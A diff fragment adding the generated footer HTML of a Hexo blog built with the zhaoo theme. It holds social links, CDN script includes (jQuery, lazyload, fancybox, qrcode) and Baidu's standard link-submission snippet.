+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
